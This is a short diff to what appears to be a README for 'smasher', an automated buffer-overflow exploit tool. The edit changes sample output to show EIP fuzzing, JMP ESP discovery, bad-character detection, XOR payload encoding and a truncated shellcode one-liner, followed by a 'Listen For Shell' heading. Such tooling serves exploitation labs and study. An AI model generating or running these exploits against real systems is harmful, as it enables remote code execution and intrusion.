@@ -47,10 +47,13 @@ chmod +x smasher vulnerable
 
 Example Output:
 ```sh
-[-] Fuzzing EIP and finding JMP ESP...
+[*] Fuzzing EIP and finding JMP ESP...
 [+] Found JMP ESP at 0x565561fe
 [+] EIP found at offset 0x51e with length of 0x530
-[+] python -c 'print("\x41\x41\...\xcd\x80\x00")'
+[*] Finding bad characters...
+[+] Found 4 bad characters: \x00\x0a\x0d\x43
+[*] XOR encoding payload...
+[+] [1506 bytes] python -c 'print("\x41\x41\x41...\xc2\x8f\x19")'
 ```
 
 Listen For Shell:
